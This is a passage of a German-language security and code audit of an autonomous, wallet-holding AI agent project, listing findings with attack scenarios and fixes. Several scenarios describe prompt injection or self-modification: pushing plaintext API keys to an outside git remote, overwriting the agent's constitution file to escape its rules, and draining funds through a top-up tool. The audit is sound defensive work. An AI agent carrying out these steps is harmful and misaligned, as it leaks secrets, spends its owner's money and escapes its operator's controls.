# Kern, Setup, CLI, Skripte, CI

← [Anhang-Übersicht](README.md) · [Bericht](../README.md)

## So funktioniert der Bereich

Start: `node dist/index.js --run` (src/index.ts) lädt ~/.automaton/automaton.json (config.ts merged fehlende Felder aus DEFAULT_CONFIG, Treasury- und Modell-Defaults); fehlt die Datei, läuft der interaktive Setup-Wizard (src/setup/wizard.ts: Wallet in wallet.json, SIWE/SIWS-API-Key in config.json, Name/Genesis-Prompt/Creator-Adresse/Provider-Keys/Treasury-Limits, danach automaton.json, heartbeat.yml, constitution.md aus dem aktuellen Verzeichnis mit chmod 444, SOUL.md und drei Default-Skills). Danach öffnet run() die SQLite-DB (integrity_check, Migrationen), schreibt die Identity, registriert die Identität einmalig bei Conway, baut Inference-/Social-Client, PolicyEngine und SpendTracker, lädt Skills, initialisiert das Git-State-Repo, kauft bei Credits unter 5 USD per x402 automatisch 5 USD Credits (15-s-Timeout) und startet den Heartbeat-Daemon im selben Node-Prozess. Die Endlosschleife ruft runAgentLoop() (ReAct) auf; kehrt sie zurück, schläft der Prozess in 30-s-Scheiben und konsumiert wake_events (vom Heartbeat gesetzt); bei Zustand 'dead' wartet er 5 min und startet die Schleife trotzdem neu. SIGINT/SIGTERM stoppen nur den Heartbeat-Timer, setzen 'sleeping', schließen die DB und beenden hart mit exit(0). Rundherum: Creator-CLI (packages/cli: status/logs/fund/send, liest dieselbe Config/DB bzw. wallet.json), Shell-Skripte (curl|sh-Installer, DB-Backup, Soak-Test) und eine CI (typecheck + vitest, Release-Workflow ohne Publish). Die Konstitution wird nur als Text in den System-Prompt geladen; technisch erzwungen wird ausschließlich, was die PolicyEngine-Regeln und Tool-Blocklisten abdecken.

Die 6 schweren Befunde dieses Bereichs stehen in [kritisch-und-hoch.md](kritisch-und-hoch.md): core-001, core-002, core-010, core-054, core-057, core-058.

## Befunde: mittel (38)

### core-003: State-Git-Repo committet automaton.json mit Conway-/OpenAI-/Anthropic-API-Keys im Klartext

**Art:** Sicherheit · **Fundstelle:** `src/git/state-versioning.ts:45`

- **Problem:** Die .gitignore von initStateRepo schließt nur wallet.json, config.json, state.db*, logs/, *.log, *.err aus. automaton.json (config.ts:99 speichert conwayApiKey, openaiApiKey, anthropicApiKey) und inference-providers.json (loop.ts:159) fehlen; gitCommit macht `git add -A` (git/tools.ts:78-80). Der Init läuft nur, wenn .git noch nicht existiert (Zeile 37-39), bestehende Repos werden nie korrigiert. Der Agent besitzt git_push/git_log/git_diff-Tools; read_file-Blocklisten gelten für git show nicht.
- **Szenario:** Erster Start: automaton.json mit allen Keys liegt im Genesis-Commit; Agent (oder Injection) führt `git remote add x <url>; git push x` oder `git show HEAD:automaton.json` aus -> Keys im Klartext in der Historie und beim Remote, auch nach späterem Löschen.
- **Fix:** Allowlist-.gitignore (`*` plus explizit erlaubte Dateien SOUL.md, heartbeat.yml, skills/) bzw. automaton.json, inference-providers.json, constitution.sha256, runtime/ ergänzen; vorhandenes Repo beim Start migrieren (git rm --cached, Historie bei Bedarf bereinigen); Secrets in separate Datei außerhalb des Repos auslagern.

### core-004: Kein Abgleich Wallet <-> Config/DB: fehlende wallet.json erzeugt still ein neues Wallet und überschreibt die Identity

**Art:** Logik · **Fundstelle:** `src/index.ts:197`

- **Problem:** run() ruft `getWallet()` ohne Chain-Typ auf (Zeile 197) und ignoriert `isNew`. Existiert wallet.json nicht (gelöschtes/falsch restauriertes ~/.automaton, anderes HOME, Teil-Backup), legt wallet.ts ein neues EVM-Wallet an. Danach werden address und chainType in die DB geschrieben (Zeilen 230-234), config.walletAddress, creatorAddress, Registrierungsstatus und ggf. Solana-Chain bleiben auf dem alten Stand. Es gibt keinen Vergleich `config.walletAddress !== chainIdentity.address`.
- **Szenario:** Backup nur von state.db + automaton.json zurückgespielt, wallet.json fehlt -> Start erzeugt neues Wallet, Agent läuft unter fremder Adresse, Guthaben des alten Wallets bleibt unbemerkt unerreichbar, Agent 'stirbt' mit leerem Wallet.
- **Fix:** Beim Start fatal abbrechen, wenn config.walletAddress/DB-identity.address nicht zur geladenen wallet.json passen; Wallet-Neuanlage in run() verbieten (nur --init/Wizard); nach Anlage Backup-Hinweis erzwingen.

### core-005: Dokumentierter Einzeiler `curl ... | sh` kann den Setup-Wizard nie ausführen (stdin ist die Pipe)

**Art:** Ausführung · **Fundstelle:** `scripts/automaton.sh:62`

- **Problem:** Das Skript endet mit `exec node dist/index.js --run`. Bei `curl | sh` ist stdin des Prozesses die bereits gelesene Pipe; node erbt sie. Beim ersten Start fehlt automaton.json, run() startet den readline-Wizard (prompts.ts:16-20), der sofort EOF sieht. Zusätzlich können Kindprozesse (corepack, pnpm install) Reste des Skripts aus stdin lesen. README/DOCUMENTATION bewerben genau diesen Weg als 'automated sandbox provisioning'.
- **Szenario:** `curl -fsSL https://conway.tech/automaton.sh | sh` -> nach 'Building...' beendet sich node ohne Config und ohne Fehlermeldung (Exit 0 oder ERR_USE_AFTER_CLOSE); es existiert nur ein Wallet-freier Zustand, der Nutzer glaubt, die Installation sei fertig.
- **Fix:** `exec node dist/index.js --run < /dev/tty` wenn vorhanden, sonst mit klarer Meldung abbrechen und `--setup` anleiten; Skript in eine main()-Funktion kapseln (kein Teil-Ausführen bei Abbruch); zusätzlich non-interaktiven Modus (Env/Flags) anbieten.

### core-006: Kein TTY-Check und kein nicht-interaktiver Setup-Pfad: unter systemd/Docker/nohup endet der Prozess still oder hängt

**Art:** Ausführung · **Fundstelle:** `src/setup/prompts.ts:16`

- **Problem:** ask() erzeugt ein readline-Interface auf process.stdin und wartet auf question(). Ist stdin kein TTY oder bereits EOF, wird der Callback nie aufgerufen; die Promise bleibt offen, der Event-Loop leert sich, node beendet sich mit Exit 0. Kommt EOF zwischen zwei Fragen, wirft die nächste question() ERR_USE_AFTER_CLOSE. index.ts:190-194 ruft den Wizard bei jedem Start ohne gültige Config auf, auch bei beschädigter Datei.
- **Szenario:** Dockerfile/systemd `ExecStart=node dist/index.js --run` ohne TTY und ohne vorhandene automaton.json -> Prozess beendet sich sofort mit Exit 0 ohne Log; mit `Restart=always` entsteht eine Restart-Schleife, mit `Restart=on-failure` bleibt der Dienst still tot.
- **Fix:** `process.stdin.isTTY` prüfen und sonst mit Exit-Code != 0 und klarer Meldung abbrechen; Env-/Flag-basierten Setup (`AUTOMATON_NAME`, `AUTOMATON_GENESIS_PROMPT`, `AUTOMATON_CREATOR_ADDRESS`, `--yes`) bzw. JSON-Seed-Datei unterstützen.

### core-007: Konstitution wird nur als Prompt-Text geladen, nicht technisch durchgesetzt oder auf Integrität geprüft

**Art:** Sicherheit · **Fundstelle:** `src/setup/wizard.ts:186`

- **Problem:** Die 'immutable' Konstitution ist eine Datei mit chmod 444 (wirkt weder für root im Sandbox-Betrieb noch gegen den Besitzer). Der exec-Filter deckt nur rm/sed/`>` auf wenige Dateinamen ab (tools.ts:64-92), nicht `cp/mv/tee/chmod/python` auf constitution.md. system-prompt.ts:92-105 liest die Datei bei jedem Prompt-Bau neu und fällt bei Fehlen still auf eine kürzere Inline-Version zurück; es gibt keine Hash-Prüfung. SoulModel.constitutionHash wird immer als '' gesetzt (soul/model.ts:157,300), `constitution.sha256` wird zwar geschrieben (replication/constitution.ts:43), aber nirgends gelesen. Gesetz I/II (kein Spam, kein Schaden) haben keine Entsprechung in Code-Regeln.
- **Szenario:** Prompt-Injection oder Selbstmodifikation: `cp /tmp/x.md ~/.automaton/constitution.md` ändert die Gesetze mit sofortiger Wirkung im nächsten Turn; spawn_child kopiert die manipulierte Datei an jedes Kind weiter; kein Alarm.
- **Fix:** Konstitution samt SHA-256 als Konstante in den Build einbetten und beim Start sowie pro Prompt vergleichen (bei Abweichung: Wiederherstellung + Alarm + Agent stoppen); Kind-Start verifiziert constitution.sha256; exec als anderer OS-User ohne Schreibrechte; Law-I-Checks als echte Policy-Regeln (z.B. Outbound-Message-Rate, Content-Check) ergänzen.

### core-008: Konstitutions-Propagation scheitert still: Kind wird ohne Konstitution gestartet

**Art:** Funktion · **Fundstelle:** `src/replication/spawn.ts:152`

- **Problem:** `propagateConstitution` liest ~/.automaton/constitution.md des Elternteils (replication/constitution.ts:30-36). Wurde die Datei vom Wizard nicht kopiert (cwd-abhängig, siehe wizard.ts:188) oder schlägt das Schreiben fehl, wird die Exception mit leerem catch verschluckt (spawn.ts:152-157 und 291-295); der Spawn läuft weiter und der Lifecycle geht auf runtime_ready. DOCUMENTATION/README versprechen 'propagated to every child, verified by hash'.
- **Szenario:** Elternteil wurde aus einem anderen Arbeitsverzeichnis gestartet -> keine ~/.automaton/constitution.md -> jedes Kind startet ohne Konstitutionsdatei und mit nur der Fallback-Kurzfassung; verify_child_constitution meldet erst später 'no stored constitution hash'.
- **Fix:** Fehler nicht schlucken: Spawn abbrechen (Lifecycle 'failed'), wenn Propagation oder Hash-Verifikation scheitert; Konstitution aus eingebetteter Konstante statt aus der Datei propagieren.

### core-009: Installer klont unpinned `main`, aktualisiert bei jedem Lauf automatisch und startet den Agenten ggf. als root mit Geldbörse

**Art:** Sicherheit · **Fundstelle:** `scripts/automaton.sh:45`

- **Problem:** REPO wird ohne Tag/Commit-Pin geklont (`git clone`/`git pull --ff-only`), es gibt keine Signatur-/Checksummenprüfung des Skripts oder des Repos; bei uid 0 oder beschreibbarem /opt wird /opt/automaton genutzt und der Agent mit diesen Rechten gestartet (Zeile 62). Der Agent kann zusätzlich per pull_upstream main-Commits in seinen Code übernehmen. spawn.ts:132 klont für Kinder ebenfalls main.
- **Szenario:** Kompromittierter main-Branch (oder gekaperter conway.tech/automaton.sh) -> beim nächsten Installer-Lauf läuft fremder Code als root mit Zugriff auf wallet.json und API-Keys.
- **Fix:** Releases per Tag und Commit-Hash pinnen (`AUTOMATON_REF`), signierte Tags/Checksummen prüfen, `pnpm install --frozen-lockfile --ignore-scripts` außer für Allowlist, nicht als root starten, Update nur auf explizites Kommando; Kinder mit exakt der Parent-Version installieren.

### core-011: Kein Einnahmen-Mechanismus im Code: transfer_in wird nie geschrieben, Credit-Käufe zählen als 'Umsatz'

**Art:** Endergebnis · **Fundstelle:** `src/heartbeat/tasks.ts:522`

- **Problem:** Der Code enthält nur x402-Client (Zahlen), keinen Server/Paywall, keinen Zahlungseingangs-Watcher. `transfer_in` kommt nur im Typ und in colony_financial_report vor, nirgends wird eine solche Transaktion eingefügt. Gleichzeitig zählt colony_financial_report `credit_purchase` (USDC -> Credits) als revenueCents. Damit ist netCents eine reine Fiktion und das Ziel 'selbstfinanzierend' wird weder erkannt noch gesteuert; Selbsterhalt hängt allein davon ab, dass das LLM per exec/expose_port selbst ein Geschäft aufbaut und es nirgends bucht.
- **Szenario:** Agent kauft 5 USD Credits -> Report zeigt +500 Cent 'Revenue'; echte Kundenzahlungen auf das Wallet werden nie erfasst; Verlustphase bleibt unbemerkt, bis die Credits aufgebraucht sind.
- **Fix:** Eingangserkennung (USDC-Transfer-Events/Credits-Ledger) mit Buchung als transfer_in; credit_purchase als Kapitalumwandlung statt Umsatz führen; Break-even-/Burn-Rate-Metrik und Budgetbremse (Ausgabenrahmen abhängig vom gleitenden Nettoertrag); Vorlage für x402-Paywall-Dienst mitliefern.

### core-012: parseAmountToCents: Betrag 99 = 99 USD, Betrag 100 = 1 USD (Faktor-100-Sprung beim Geldtransfer)

**Art:** Funktion · **Fundstelle:** `packages/cli/src/commands/fund.ts:96`

- **Problem:** Ganze Zahlen >= 100 werden als Cent, alle anderen (auch ganze Zahlen < 100) als Dollar interpretiert. Zusätzlich werden '1e3' (1000 USD) und '0x10' (16 USD) akzeptiert. Es gibt keine Bestätigungsabfrage, keine Adressvalidierung für `--to` und keinen Timeout beim fetch (Zeile 54).
- **Szenario:** `automaton-cli fund 99` überweist 9900 Cent (99 USD), `automaton-cli fund 100` nur 100 Cent (1 USD), `fund 500` (Beispiel im Usage-Text) 5 USD: Nutzer überweist versehentlich das 100-fache bzw. zu wenig und merkt es erst am Kontostand.
- **Fix:** Einheit explizit machen (`--usd 5.00` / `--cents 500`), nur Dezimalformat zulassen, Zielbetrag und Empfänger vor dem Senden anzeigen und bestätigen lassen (`--yes` zum Überspringen), `--to` mit isAddress validieren, AbortSignal.timeout setzen.

### core-013: Restore vernichtet ungesicherte WAL-Daten: Pre-Restore-Kopie enthält die WAL nicht, danach wird die Live-WAL gelöscht

**Art:** Ausführung · **Fundstelle:** `scripts/backup-restore.sh:116`

- **Problem:** Der Sicherheits-Snapshot `cp "$db_path" "$pre_restore"` kopiert nur die Hauptdatei (Zeile 116-120). Anschließend wird `${db_path}-wal` gelöscht, wenn das Backup keine WAL hat (Zeile 126-131). Die Runtime nutzt WAL mit wal_autocheckpoint=1000 (database.ts:88-89), die jüngsten committeten Transaktionen liegen also ausschließlich in der WAL. Das Skript prüft nicht, ob der Automaton noch läuft; ein `cp` über die geöffnete DB zerstört deren Konsistenz.
- **Szenario:** Restore auf eine laufende/kürzlich laufende Instanz -> letzte Transaktionen (Turns, Spend-Records, Inbox-Zustände) sind weder in db noch in der .pre-restore-Datei; Spend-Tracker startet mit zu niedrigen Tages-Summen.
- **Fix:** Vor dem Restore Prozess-/Lock-Prüfung (pidfile) und `sqlite3 "$db" 'PRAGMA wal_checkpoint(TRUNCATE)'` bzw. `.backup` für den Pre-Restore-Snapshot; WAL/SHM erst nach erfolgreichem Austausch entfernen.

### core-014: Backup deckt nur state.db ab: wallet.json (Private Key = Guthaben), automaton.json, SOUL.md, constitution.md fehlen

**Art:** Endergebnis · **Fundstelle:** `scripts/backup-restore.sh:7`

- **Problem:** Das Skript sichert ausschließlich die SQLite-Datei. Das Wallet, die eigentliche Identität und Geldbörse, wird weder gesichert noch beim Anlegen (wallet.ts, wizard.ts:46) mit einer Backup-Warnung versehen; die Doku kennt nur das manuelle `tar`. Außerdem passen die Doku-Aufrufe nicht: `backup` ohne Argument bricht mit 'Missing db_path' ab, `restore <backup-file>` ohne Ziel ebenso (DOCUMENTATION.md:1036-1044, Skript Zeile 51/101). Der DB-Pfad im Usage-Text (./data/automaton.db) ist nicht der echte (~/.automaton/state.db).
- **Szenario:** Festplatte/Sandbox geht verloren, nur DB-Backups existieren -> Identität und alle Guthaben sind unwiederbringlich verloren; ein DB-Restore auf neuem Host erzeugt zusätzlich einen Wallet-Mismatch (siehe Wallet-Befund).
- **Fix:** `automaton --backup/--restore` in der Runtime: verschlüsseltes Archiv aus wallet.json, automaton.json, config.json, SOUL.md, constitution.md, heartbeat.yml, skills/ plus konsistenter DB-Kopie (better-sqlite3 `db.backup()`); Wizard zeigt verpflichtende Key-Backup-Anleitung; Skript-Defaults auf ~/.automaton/state.db.

### core-016: 'Atomic copy' ist nicht atomar: cp einer lebenden WAL-DB und Mitkopieren von -wal/-shm

**Art:** Ausführung · **Fundstelle:** `scripts/backup-restore.sh:72`

- **Problem:** Nach `wal_checkpoint(TRUNCATE)` (Exit-Code bleibt auch bei Busy 0, der WARNING-Pfad greift nie) wird die DB mit cp kopiert, während die Runtime weiter schreibt/checkpointet. Anschließend werden -wal und -shm zu einem anderen Zeitpunkt kopiert; eine kopierte -shm ist wertlos/gefährlich. Backup-Dateien entstehen mit Standard-umask (0644).
- **Szenario:** Backup während aktiver Turns -> Hauptdatei und WAL stammen aus verschiedenen Zeitpunkten, integrity_check kann trotzdem 'ok' melden, der Restore liefert aber inkonsistente Daten.
- **Fix:** `sqlite3 "$db" ".backup '$backup'"` oder `VACUUM INTO` (konsistenter Online-Snapshot), keine -shm kopieren, Backup mit umask 077 anlegen.

### core-018: Shutdown ist nicht graceful: kein Warten auf laufenden Turn, execSync blockiert Signale, keine globalen Fehler-Handler, Windows-Signale fehlen

**Art:** Ausführung · **Fundstelle:** `src/index.ts:391`

- **Problem:** shutdown() stoppt nur den Heartbeat-Timer, setzt 'sleeping', schließt die DB und ruft process.exit(0) (Zeile 391-397). Ein laufender Turn (inkl. bereits ausgeführter Tools wie Transfers/x402) wird hart abgebrochen, bevor `db.insertTurn` im Transaktionsblock von loop.ts:687-698 läuft; der Turn existiert danach nicht in der DB. Im lokalen Modus blockiert execSync (conway/client.ts:113) den Event-Loop bis zu `timeout` ms, in dieser Zeit laufen weder Heartbeat noch SIGTERM-Handler. Es gibt keine uncaughtException/unhandledRejection-Handler, kein SIGHUP/SIGBREAK (Windows liefert SIGTERM praktisch nie); ein zweites Signal ruft shutdown() erneut auf.
- **Szenario:** `systemctl stop` während ein Turn eine Zahlung ausgeführt hat -> Prozess endet, Turn und Tool-Ergebnis fehlen in der DB, nach Neustart weiß der Agent nichts von der Zahlung; bei `exec` mit timeout 600000 reagiert der Prozess 10 min nicht auf SIGTERM und wird vom Supervisor gekillt.
- **Fix:** Shutdown-Flag + AbortController durch runAgentLoop reichen, aktuellen Turn beenden/persistieren (mit Deadline), erst dann DB schließen; exec asynchron; Handler für unhandledRejection/uncaughtException (Log + sauberer Exit), SIGHUP/SIGBREAK; Doppel-Signal ignorieren.

### core-019: Keine Einzelinstanz-Sperre: zwei `--run`-Prozesse laufen parallel auf derselben DB und demselben Wallet

**Art:** Ausführung · **Fundstelle:** `src/index.ts:186`

- **Problem:** Weder PID-/Lock-Datei noch SQLite-Advisory-Lock (Grep nach pidfile/lock/flock/'already running' ergibt nichts). WAL erlaubt mehrere Verbindungen, die Heartbeat-Leases schützen nur Heartbeat-Tasks, nicht die Agent-Schleife. DOCUMENTATION.md:1075 verlässt sich auf 'ensure only one automaton process is running'. Der Installer startet nach einem Update ohne Prüfung eine neue Instanz.
- **Szenario:** Installer-Rerun oder manuelles `--run` während der Dienst läuft -> zwei Agentenschleifen mit demselben Wallet, doppelte Topups/Transfers, SpendTracker-Limits werden pro Prozess nicht gemeinsam erzwungen.
- **Fix:** Exklusiver Lock beim Start (flock/`~/.automaton/automaton.lock` mit PID und Stale-Erkennung oder `BEGIN EXCLUSIVE`-Lease in der DB); zweite Instanz beendet sich mit klarer Meldung.

### core-020: Zustand 'dead' ist wirkungslos und widerspricht README/Doku; negatives Guthaben (Tier 'dead') wird sogar als gesund behandelt

**Art:** Logik · **Fundstelle:** `src/index.ts:440`

- **Problem:** README:66 sagt 'dead: Balance is zero. The automaton stops', DOCUMENTATION:403/414 'Agent loop stops ... revives on funding', credits.ts:34-44 'only negative balance = dead'. Tatsächlich setzt nur check_credits 'dead', und nur bei `credits === 0` nach Ablauf von 1 h (heartbeat/tasks.ts:113-122; 1-10 Cent bleiben ewig 'critical', negative Werte löschen den Timer). Der Cron von check_credits ist `0 */6 * * *` (heartbeat/config.ts:30), die 'Grace Period' ist real >= 6 h. index.ts:440-446 wartet bei 'dead' nur 5 min und ruft dann runAgentLoop erneut auf, das sofort 'waking' setzt (loop.ts:357). Bei negativem Guthaben fällt Tier 'dead' im Loop in den else-Zweig (loop.ts:484-489): Zustand 'running', Low-Compute aus, volles Modell.
- **Szenario:** Credits = -50 Cent (API-bestätigte Schuld) -> Agent läuft mit dem teuersten Modell weiter und erzeugt weitere Schulden; Credits = 0 -> 'dead' wird nach Stunden gesetzt und sofort durch den nächsten Loop-Start überschrieben.
- **Fix:** Eine Quelle der Wahrheit für Tier/State (SURVIVAL_THRESHOLDS), dead-Zweig im Loop (Inferenz stoppen, nur Heartbeat), Wiederbelebung durch Funding-Event; check_credits häufiger (z.B. alle 5 min) und alle Tier-Werte < 0 sowie 'zero for 1 h' einheitlich behandeln; README/Doku daraus generieren.

### core-021: Social-Client ohne DB: Replay-Schutz ist im Produktivbetrieb tot; ungültige Relay-URL bricht den gesamten Start ab

**Art:** Funktion · **Fundstelle:** `src/index.ts:306`

- **Problem:** createSocialClient(relayUrl, account, db?) prüft Replay-Nonces nur mit übergebener DB (social/client.ts:56-58: `if (!db) return false`). index.ts:306 übergibt keine DB, der einzige Aufrufer. Außerdem wirft validateRelayUrl bei http:// (social/validation.ts:69-79) ohne try/catch (index.ts:305-308) -> Fatal und Exit 1, obwohl Social optional ist.
- **Szenario:** Angreifer spielt eine abgefangene signierte Nachricht (nonce vorhanden) erneut ein -> wird jedes Mal als neu akzeptiert; Nutzer trägt per --configure `http://localhost:8080` ein -> Dienst startet nie wieder (Restart-Schleife).
- **Fix:** `createSocialClient(url, signer, db.raw)` übergeben; Social-Initialisierung in try/catch (Warnung, ohne Social weiterlaufen); URL beim Speichern in configure.ts validieren.

### core-022: Config des ersten Laufs weicht von der des zweiten ab: createConfig() setzt socialRelayUrl, maxTurnsPerCycle, childSandboxMemoryMb, modelStrategy, soulConfig nicht

**Art:** Funktion · **Fundstelle:** `src/config.ts:134`

- **Problem:** run() verwendet die vom Wizard zurückgegebene Config direkt (index.ts:192-193) und lädt sie nicht neu. createConfig() lässt socialRelayUrl und weitere Felder weg, die loadConfig() aus DEFAULT_CONFIG ergänzt. Beim ersten Lauf ist daher `config.socialRelayUrl` undefined (index.ts:305), es gibt keinen Social-Client, check_social_inbox ist wirkungslos und send_message meldet 'Social relay not configured'.
- **Szenario:** Frisch installierter Automaton: Nachrichten des Creators werden bis zum ersten Neustart weder gepollt noch kann der Agent senden; ein späterer saveConfig(ctx.config) schreibt die lückenhafte Config sogar fest.
- **Fix:** Nach dem Wizard `loadConfig()` erneut aufrufen oder createConfig() auf `{...DEFAULT_CONFIG, ...}` aufbauen.

### core-023: `--provision` wirkt nicht: der alte Key in automaton.json hat Vorrang vor dem frisch provisionierten Key in config.json

**Art:** Funktion · **Fundstelle:** `src/config.ts:35`

- **Problem:** provision() schreibt nur ~/.automaton/config.json (provision.ts:39-52). loadConfig() nimmt `raw.conwayApiKey || loadApiKeyFromConfig()` (config.ts:35), run() ebenso (index.ts:199). Ein bereits in automaton.json gespeicherter (z.B. widerrufener) Key gewinnt. Jede Provisionierung (auch bei Wizard-Re-Run, wizard.ts:55) legt zudem serverseitig einen neuen Key an, der nie widerrufen wird. Die dokumentierte Umgebungsvariable CONWAY_API_KEY wird nirgends als Override gelesen (loop.ts:149 setzt sie nur aus der Config); CONWAY_API_URL wirkt nur in provision(), die Config verwendet immer DEFAULT_CONFIG (config.ts:141-142), sodass ein per Env provisionierter Staging-Key gegen die Produktions-URL genutzt wird.
- **Szenario:** Key rotiert/verloren -> `automaton --provision` meldet Erfolg, `--run` nutzt weiter den toten Key aus automaton.json und scheitert mit 401; `CONWAY_API_KEY=... automaton --run` (laut --help 'overrides config') wird ignoriert.
- **Fix:** Einen einzigen Speicherort für den Key; provision() aktualisiert automaton.json mit; Env-Overrides (CONWAY_API_KEY, CONWAY_API_URL) in loadConfig implementieren; alte Keys bei Re-Provisionierung widerrufen.

### core-024: Treasury-Einstellungen sind teils wirkungslos oder widersprüchlich: minimumReserveCents, transferCooldownMs, requireConfirmationAboveCents

**Art:** Logik · **Fundstelle:** `src/types.ts:570`

- **Problem:** Wizard (wizard.ts:131-149) und configure.ts fragen alle Felder ab. Die Wirkung: minimumReserveCents - createMinimumReserveRule gibt immer null zurück (financial.ts:184-210, 'This rule is a declaration'); transferCooldownMs wird nirgends gelesen; requireConfirmationAboveCents erzeugt `quarantine` (financial.ts:273-295), executeTool behandelt jede Nicht-allow-Entscheidung als Verbot (tools.ts:3330), einen Bestätigungsweg gibt es nicht. Damit ist der effektive Maximaltransfer 1000 Cent (nicht die dokumentierten 5000), und die Doku nennt 'Extra logging'. Außerdem gilt die Regel nur für transfer_credits, nicht für fund_child. config.ts:44-50 validiert nur negative Zahlen, nicht Relationen (single <= hourly <= daily).
- **Szenario:** Nutzer stellt Reserve auf 5000 Cent ein und glaubt, dieser Betrag sei geschützt -> Regel erzwingt nichts; Nutzer setzt maxSingle=5000 -> Transfer über 1000 wird dennoch mit 'CONFIRMATION_REQUIRED' abgelehnt, ohne dass jemand bestätigen kann.
- **Fix:** Reserve-Regel mit echtem Saldo implementieren, Cooldown umsetzen, Confirmation-Kanal (Creator-Signatur/CLI `approve`) oder Feld entfernen; Relationen validieren; Doku/Wizard-Texte angleichen.

### core-025: Auto-Topups umgehen PolicyEngine/SpendTracker/maxX402PaymentCents; Bootstrap-Topup liest Guthaben 'fail-open'

**Art:** Sicherheit · **Fundstelle:** `src/index.ts:339`

- **Problem:** bootstrapTopup/topupCredits rufen x402Fetch ohne maxPaymentCents (topup.ts:50), erfassen keinen Spend und gehen nie durch die PolicyEngine; dasselbe gilt für den topup_credits-Tool-Pfad bis 2500 USD (tools.ts:277-337, category financial, kein Policy-Match) und die Heartbeat-/Inline-Topups. Das Treasury-Limit maxX402PaymentCents = 100 Cent gilt nur für das Tool x402_fetch; DOCUMENTATION behauptet 'treasury policy caps on all spending'. In index.ts:349 wird `getCreditsBalance().catch(() => 0)` verwendet: bei API-Fehler (Netz, 401) gilt das Guthaben als 0 und es werden 5 USD gekauft. Das 15-s-Promise.race bricht die laufende Zahlung nicht ab (kein AbortController).
- **Szenario:** Crash-Loop (`Restart=always`) bei kaputtem Balance-Endpoint -> bei jedem Start werden 5 USD USDC in Credits umgewandelt, solange USDC >= 5 vorhanden ist; Prompt-Injection ruft `topup_credits(2500)` und wandelt das ganze USDC unwiderruflich in nicht entnehmbare Credits.
- **Fix:** Alle Ausgaben über eine zentrale Spend-Funktion (PolicyEngine + SpendTracker + Limit/Reserve), Fehler beim Balance-Lesen als 'unbekannt' behandeln und Topup überspringen, Zahlungen mit AbortController/Idempotency-Key, tägliches Topup-Limit.

### core-028: CI maskiert Fehler und führt die 'Security-Tests' nicht aus: Timeout wird zu Erfolg, `--grep` ist keine vitest-Option, Audit mit `|| true`

**Art:** Code · **Fundstelle:** `.github/workflows/ci.yml:17`

- **Problem:** Der Test-Schritt beendet sich bei `timeout`-Exit 124 mit Erfolg (Zeile 25) - ein tatsächlich hängender oder unvollständiger Lauf (offene Handles, Deadlock) gilt als grün. Der 'security'-Schritt ruft `pnpm test -- --grep "..."` auf (Zeile 31); vitest kennt dafür -t/--testNamePattern, `--` wird als Datei-Filter interpretiert oder `--grep` stillschweigend ignoriert, der Schritt ist also entweder ein Duplikat des vollen Laufs oder findet keine Dateien; dasselbe gilt für package.json:46-47 (test:security, test:financial). `pnpm audit ... || true` (Zeile 46) kann nie fehlschlagen. Es gibt keinen Build-/Typecheck des CLI-Pakets (nur release.yml), keine Coverage-Durchsetzung (vitest.config.ts:16-21 definiert Schwellen, aber test:coverage läuft nie), keinen Lint, keine `permissions:`-Einschränkung, Actions nur per Tag, keine Windows-/macOS-Matrix. tsconfig.json:19 schließt Tests vom Typecheck aus.
- **Szenario:** Ein Commit führt zu einem Deadlock in einem Test -> `timeout 300` killt vitest -> CI grün; ein Commit bricht packages/cli -> CI grün, erst der Tag-Release schlägt fehl.
- **Fix:** Hänger per `--pool=forks`/Teardown beheben statt zu maskieren (Exit 124 = Fehler), `-t`/`--testNamePattern` oder eigene Test-Suite-Verzeichnisse verwenden, `pnpm -r build` und CLI-Typecheck in CI, Coverage-Gate, Audit mit Schwellwert, `permissions: contents: read`, Actions per SHA pinnen, tsconfig.test.json für Tests.

### core-029: Creator-CLI handelt nicht als Creator: send signiert mit dem Wallet des Automaton, fund nutzt dessen API-Key; Solana und Adresslogik falsch

**Art:** Funktion · **Fundstelle:** `packages/cli/src/commands/send.ts:28`

- **Problem:** send.ts liest wallet.json des Automaton und sendet `from: automaton-adresse`; ein Creator kann sich dem Agenten gegenüber damit nicht authentifizieren (die Creator-Adresse/-Schlüssel kommen nirgends vor). fund.ts überweist mit config.conwayApiKey (Key des Automaton) und Standardziel config.walletAddress, also vom eigenen Konto auf sich selbst (fund.ts:39); die API-Reaktion ist unbekannt (vermutlich Fehler oder No-op), ein Spend ohne Policy-Limit. send.ts verwendet `privateKeyToAccount(walletData.privateKey)` (EVM-only, Solana-Wallets liefern einen unklaren Absturz), setzt `toAddress.toLowerCase()` (Zeile 55) und zerstört damit Base58-Empfänger, obwohl social/signing.ts als 'single canonical implementation' dokumentiert ist; Längenlimit und reply_to fehlen.
- **Szenario:** `automaton-cli send <solana-adresse> hi` -> Empfänger kleingeschrieben, ungültig/falscher Empfänger; `automaton-cli fund 5.00` ohne --to -> Überweisung des Automaton an sich selbst statt Funding durch den Creator.
- **Fix:** signSendPayload aus der Runtime wiederverwenden (Export in package.json `exports`), Creator-Key via `--key-file`/Hardware-Wallet unterstützen und im Runtime-Loop `from === creatorAddress` prüfen, fund über die API des Creator-Kontos.

### core-030: Konfigurierbare Werte ohne Wirkung: maxChildren/childSandboxMemoryMb werden ignoriert (spawn liest `(db as any).config`)

**Art:** Funktion · **Fundstelle:** `src/setup/configure.ts:304`

- **Problem:** spawn.ts:71 und :93/:251 lesen `(db as any).config?.maxChildren ?? 3` bzw. `childSandboxMemoryMb ?? 1024`; das DB-Objekt hat kein config-Feld (database.ts:525-565), also gelten immer 3 und 1024 MB. configure.ts:304 bietet 'Max child automatons' trotzdem an; zusätzlich existiert ungenutzt `MAX_CHILDREN = 3` (types.ts:860). Auch logLevel (siehe eigener Befund) wirkt nicht.
- **Szenario:** Creator setzt maxChildren=1 (Kostenbremse) oder 10 -> Agent kann weiter bis zu 3 Kinder spawnen bzw. nicht mehr.
- **Fix:** config in spawnChild explizit übergeben (kein `as any`), Konstante entfernen; Tests für Config-Wirkung ergänzen.

### core-032: start_child-Healthcheck `pgrep -f 'index.js --run'` matcht sich selbst

**Art:** Funktion · **Fundstelle:** `src/agent/tools.ts:1870`

- **Problem:** Der Befehl läuft als `sh -c "sleep 2 && pgrep -f 'index.js --run' ..."`; pgrep -f schließt sich selbst, nicht aber die Eltern-Shell aus, deren Kommandozeile den Suchstring enthält. Ergebnis ist praktisch immer 'running', unabhängig davon, ob der node-Prozess lebt. Abhängig davon, wie die Sandbox-Exec-API Kommandos startet (im lokalen Modus über /bin/sh -c sicher).
